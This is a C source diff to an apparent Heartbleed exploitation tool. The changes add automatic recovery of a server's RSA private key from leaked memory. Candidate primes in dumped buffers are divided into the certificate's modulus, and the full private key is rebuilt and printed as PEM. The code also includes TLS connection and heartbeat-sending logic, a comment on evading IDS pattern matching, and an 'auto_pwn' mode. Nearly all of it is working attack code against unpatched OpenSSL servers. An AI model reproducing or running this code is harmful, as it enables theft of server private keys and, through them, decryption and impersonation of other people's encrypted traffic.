@@ -64,6 +64,8 @@
 #include <openssl/bio.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <openssl/rsa.h>
+
 int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
 
 /*
@@ -96,8 +98,9 @@ struct DumpArgs {
     unsigned loop_count;
     unsigned ip_ver;
     unsigned port;
-    unsigned byte_count;
+    size_t byte_count;
     BIGNUM n;
+    BIGNUM e;
     unsigned char buf[70000];
 };
 
@@ -233,14 +236,87 @@ my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
 }
 
 /****************************************************************************
+ * Given two primes, generate an RSA key. From RFC 3447 Appendix A.1.2
+ *
+    RSAPrivateKey ::= SEQUENCE {
+          version           Version,
+          modulus           INTEGER,  -- n
+          publicExponent    INTEGER,  -- e
+          privateExponent   INTEGER,  -- d
+          prime1            INTEGER,  -- p
+          prime2            INTEGER,  -- q
+          exponent1         INTEGER,  -- d mod (p-1)
+          exponent2         INTEGER,  -- d mod (q-1)
+          coefficient       INTEGER,  -- (inverse of q) mod p
+          otherPrimeInfos   OtherPrimeInfos OPTIONAL
+      }
+ ****************************************************************************/
+RSA *
+rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
+{
+    BN_CTX *ctx = BN_CTX_new();
+    RSA *rsa = RSA_new();
+    BIGNUM p1[1], q1[1], r[1];
+
+    BN_init(p1);
+    BN_init(q1);
+    BN_init(r);
+
+	rsa->p = BN_new();
+    BN_copy(rsa->p, p);
+    rsa->q = BN_new();
+    BN_copy(rsa->q, q);
+    rsa->e = BN_new();
+    BN_copy(rsa->e, e);
+
+    /*
+     * n - modulus (should be same as original cert, but we
+     * recalcualte it here 
+     */
+    rsa->n = BN_new();
+    BN_mul(rsa->n, rsa->p, rsa->q, ctx);
+
+    /*
+     * d - the private exponent 
+     */
+    rsa->d = BN_new();
+    BN_sub(p1, rsa->p, BN_value_one());
+    BN_sub(q1, rsa->q, BN_value_one());
+    BN_mul(r,p1,q1,ctx);
+	BN_mod_inverse(rsa->d, rsa->e, r, ctx);
+
+    /* calculate d mod (p-1) */
+    rsa->dmp1 = BN_new();
+	BN_mod(rsa->dmp1, rsa->d, rsa->p, ctx);
+
+    /* calculate d mod (q-1) */
+    rsa->dmq1 = BN_new();
+	BN_mod(rsa->dmq1, rsa->d, rsa->q, ctx);
+
+  	/* calculate inverse of q mod p */
+    rsa->iqmp = BN_new();
+  	BN_mod_inverse(rsa->iqmp, rsa->q, rsa->p, ctx);
+
+
+
+    BN_free(p1);
+    BN_free(q1);
+    BN_free(r);
+
+    BN_CTX_free(ctx);
+
+    return rsa;
+}
+
+/****************************************************************************
  * This function searches a buffer looking for a prime that is a factor
  * of the public key
  ****************************************************************************/
 int
-find_private_key(const BIGNUM *n, const unsigned char *buf, size_t buf_length)
+find_private_key(const BIGNUM *n, const BIGNUM *e, const unsigned char *buf, size_t buf_length)
 {
     size_t i;
-    int prime_length = 128;
+    int prime_length = n->top * sizeof(BN_ULONG);
     BN_CTX *ctx;
     BIGNUM p;
     BIGNUM dv;
@@ -250,6 +326,7 @@ find_private_key(const BIGNUM *n, const unsigned char *buf, size_t buf_length)
     BN_init(&rem);
     BN_init(&p);
 
+    /* Need enough target data to hold at least one prime number */
     if (buf_length < (size_t)prime_length)
         return 0;
 
@@ -257,29 +334,52 @@ find_private_key(const BIGNUM *n, const unsigned char *buf, size_t buf_length)
 
     /* Go foward one byte at a time through the buffer */
     for (i=0; i<buf_length-prime_length; i++) {
-        if (!(buf[i+prime_length-1] & 1))
-            continue;
-        BN_bin2bn(buf + i, prime_length, &p);
 
-        /*if (!BN_is_prime_fasttest(&p, BN_prime_checks, 0, ctx, 0, 1))
-            continue;*/
-        if (p.top > 30) {
-            BN_div(&dv, &rem, n, &p, ctx);
-            if (BN_is_zero(&rem)) {
-                BIGNUM nn;
-                BN_init(&nn);
-                BN_mul(&nn, &p, &dv, ctx);
-                printf("****\n");
-                if (BN_cmp(&nn, n) == 0) {
-                    return 1;
-                }
-                BN_free(&nn);
-            }
+        /* Grab a possible little-endian prime number from the buffer.
+         * [NOTE] this assumes the target machine and this machine have
+         * roughly the same CPU (i.e. x86). If the target machine is
+         * a big-endian SPARC, but this machine is a little endian x86,
+         * then this technique won't work.*/
+        p.d = (BN_ULONG*)(buf+i);
+        p.dmax = n->top/2;
+        p.top = p.dmax;
+        
+        /* [optimization] Only process odd numbers, because even numbers
+         * aren't prime. This doubles the speed. */
+        if (!(p.d[0]&1))
+            continue;
+
+        /* [optimizaiton] Make sure the top bits aren't zero. Firstly,
+         * this won't be true for the large primes in question. Secondly,
+         * a lot of bytes in dumps are zeroed out, causing this condition
+         * to be true a lot. Not only does this quickly weed out target
+         * primes, it takes BN_div() a very long time to divide when
+         * numbers have leading zeroes
+         */
+        if (p.d[p.top-1] == 0)
+            continue;
+
+        /* Do the division, grabbing the remainder */
+        BN_div(&dv, &rem, n, &p, ctx);
+        if (!BN_is_zero(&rem))
+            continue;
+
+        /* We have a match! Let's create an X509 certificate from this */
+        {
+            RSA *rsa;
+            BIO *out = BIO_new(BIO_s_file());
+
+            BIO_set_fp(out,stdout,BIO_NOCLOSE);
+
+            rsa = rsa_gen(&p, &dv, e);
+            PEM_write_bio_RSAPrivateKey(out, rsa, NULL, NULL, 0, NULL, NULL);
+
+            /* the program doesn't need to continue */
+            exit(0);
         }
-        //printf("rem = %u\n", rem.top*8*4);
     }
 
-    BN_free(&p);
+    //BN_free(&p);
     BN_free(&dv);
     BN_free(&rem);
     BN_CTX_free(ctx);
@@ -292,7 +392,7 @@ find_private_key(const BIGNUM *n, const unsigned char *buf, size_t buf_length)
 void
 process_bleed(struct DumpArgs *args)
 {
-    int x;
+    size_t x;
 
     if (args->byte_count == 0)
         return;
@@ -303,7 +403,7 @@ process_bleed(struct DumpArgs *args)
     }
 
     if (args->is_auto_pwn) {
-        if (find_private_key(&args->n, args->buf, args->byte_count)) {
+        if (find_private_key(&args->n, &args->e, args->buf, args->byte_count)) {
             printf("key found!\n");
             exit(1);
         }
@@ -322,7 +422,7 @@ process_bleed(struct DumpArgs *args)
  * The other is offline cracking from files.
  ****************************************************************************/
 void
-parse_cert(X509 *cert, char name[512], BIGNUM *modulus)
+parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
 {
     X509_NAME *subj;
     EVP_PKEY *rsakey;
@@ -341,6 +441,7 @@ parse_cert(X509 *cert, char name[512], BIGNUM *modulus)
     if (rsakey && rsakey->type == 6) {
         BIGNUM *n = rsakey->pkey.rsa->n;
         memcpy(modulus, n, sizeof(*modulus));
+        memcpy(e, rsakey->pkey.rsa->e, sizeof(*e));
         DEBUG_MSG("[+] RSA public-key length = %u-bits\n", n->top*4*8);
     }
 }
@@ -354,7 +455,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
 {
     int x;
     struct addrinfo *addr;
-    int fd;
+    ptrdiff_t fd;
     SSL_CTX* ctx = 0;
     SSL* ssl = 0;
     BIO* rbio = 0;
@@ -443,7 +544,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * so on
      */
     fprintf(stderr, "[ ] %s: connecting...\n", address);
-    x = connect(fd, addr->ai_addr, addr->ai_addrlen);
+    x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
     if (x != 0) {
         ERROR_MSG("%s: connect failed err=%d\n", address, WSAGetLastError());
         sleep(1);
@@ -483,8 +584,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
         if (len) {
             if (len > sizeof(buf))
                 len = sizeof(buf);
-            BIO_read(wbio, buf, len);
-            x = send(fd, buf, len, 0);
+            BIO_read(wbio, buf, (int)len);
+            x = send(fd, buf, (int)len, 0);
             if (x <= 0) {
                 ERROR_MSG("[-] %s:%s send fail\n", address, port);
                 goto end;
@@ -503,7 +604,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             FD_SET(fd, &readset);
             tv.tv_sec = 0;
             tv.tv_usec = 1000;
-            x = select(fd+1, &readset, NULL, NULL, &tv);
+            x = select((int)fd+1, &readset, NULL, NULL, &tv);
             if (x > 0) {
                 x = recv(fd, buf, sizeof(buf), 0);
                 if (x > 0) {
@@ -534,7 +635,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
 
         cert = SSL_get_peer_certificate(ssl);
         if (cert) {
-            parse_cert(cert, name, &args->n);
+            parse_cert(cert, name, &args->n, &args->e);
             X509_free(cert);
         }
     }
@@ -562,7 +663,7 @@ again:
      * front, thus evading pattern-match IDS
      */
     ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
-                            http_request, strlen(http_request));
+                            http_request, (int)strlen(http_request));
     if (args->is_rand_size) {
         unsigned size = rand();
         char rbuf[3];
@@ -584,8 +685,8 @@ again:
     while ((len = BIO_pending(wbio)) != 0) {
         if (len > sizeof(buf))
             len = sizeof(buf);
-        BIO_read(wbio, buf, len);
-        x = send(fd, buf, len, 0);
+        BIO_read(wbio, buf, (int)len);
+        x = send(fd, buf, (int)len, 0);
         if (x <= 0) {
             ERROR_MSG("[-] %s:%s: send fail\n", address, port);
             goto end;
@@ -616,7 +717,7 @@ again:
         FD_SET(fd, &readset);
         tv.tv_sec = 0;
         tv.tv_usec = 1000;
-        x = select(fd+1, &readset, NULL, NULL, &tv);
+        x = select((int)fd+1, &readset, NULL, NULL, &tv);
         if (x > 0) {
             x = recv(fd, buf, sizeof(buf), 0);
             if (x > 0) {
@@ -691,6 +792,7 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
     X509 *cert;
     char name[512];
     BIGNUM modulus;
+    BIGNUM e;
     unsigned long long offset = 0;
     unsigned long long last_offset = 0;
 
@@ -709,7 +811,7 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
 		return;
 	}
     fclose(fp);
-    parse_cert(cert, name, &modulus);
+    parse_cert(cert, name, &modulus, &e);
 
     /*
      * Read in the file to process
@@ -727,7 +829,7 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
         if (bytes_read == 0)
             break;
 
-        if (find_private_key(&modulus, buf, bytes_read)) {
+        if (find_private_key(&modulus, &e, buf, bytes_read)) {
             fprintf(stderr, "found: offset=%llu\n", offset);
             exit(1);
         }
@@ -745,6 +847,29 @@ process_offline_file(const char *filename_cert, const char *filename_bin)
 	
 	end:
 	X509_free(cert);
+}
+
+/****************************************************************************
+ ****************************************************************************/
+void foo()
+{
+    const char *challenge_p = 
+    "13827796798740740191625032142481917804987720337701219461250589574860306"
+    "98521219847602522452724213714515702265060490908757177339672211295542284"
+    "22943337698259872625450268350394072526972109297483693398779569154244448"
+    "85490293394982205334572179496776463500561105913551302714633216664240686"
+    "8397945495090212967007129";
+    unsigned char buf[512];
+    BIGNUM *num = NULL;
+    int len;
+
+
+    BN_dec2bn(&num, challenge_p);
+    len = BN_bn2bin(num, buf);
+
+    hexdump(buf, len);
+
+    return;
 }
 
 
@@ -790,6 +915,7 @@ usage:
     ERR_load_BIO_strings();
     OpenSSL_add_all_algorithms();
 
+    //foo();
 
     /*
      * Parse the program options
